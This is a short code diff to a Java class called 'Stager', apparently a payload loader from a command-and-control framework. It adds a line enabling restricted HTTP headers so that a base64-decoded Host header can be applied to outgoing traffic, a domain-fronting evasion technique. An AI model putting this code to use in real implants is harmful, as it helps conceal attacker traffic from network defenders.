@@ -121,6 +121,7 @@ public class Stager extends ClassLoader {
                     String hostHeaderEnc = localProperties.getProperty(HOST_HEADER, null);
                     String decodedHdr = null;
                     if (hostHeaderEnc != null){
+                        System.setProperty("sun.net.http.allowRestrictedHeaders", "true");
                         aDecoder = new sun.misc.BASE64Decoder();
                         decodedHdr = new String( aDecoder.decodeBuffer(hostHeaderEnc) ).trim();
                         aTimer.setHostHeader(decodedHdr);
